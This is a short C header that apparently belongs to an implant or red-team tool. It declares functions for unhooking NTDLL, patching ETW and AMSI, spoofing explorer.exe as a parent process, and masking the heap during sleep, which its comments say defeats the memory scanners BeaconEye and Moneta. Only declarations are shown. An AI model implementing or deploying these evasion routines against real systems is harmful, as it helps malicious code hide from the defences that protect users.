#ifndef _EVASION_H
#define _EVASION_H

#include "common.h"

// =============================================
// NTDLL Unhooking - Replace hooked .text section
// =============================================
BOOL UnhookNtdll(VOID);

// =============================================
// ETW Bypass - Patch ETW event writing functions
// =============================================
BOOL PatchEtw(VOID);

// =============================================
// AMSI Bypass - Patch AMSI scanning functions
// =============================================
BOOL PatchAmsi(VOID);

// =============================================
// Run all evasion techniques
// =============================================
BOOL RunAllEvasion(VOID);

// =============================================
// PPID Spoofing - Open explorer.exe for use as spoofed parent process
// Caller must CloseHandle() the returned handle when done
// =============================================
HANDLE GetSpoofParentHandle(VOID);

// =============================================
// Sleep Masking - XOR heap before sleep, restore after
// Defeats in-memory scanners (BeaconEye, Moneta) during idle periods
// =============================================
VOID MaskedSleep(DWORD dwMs);

#endif // _EVASION_H
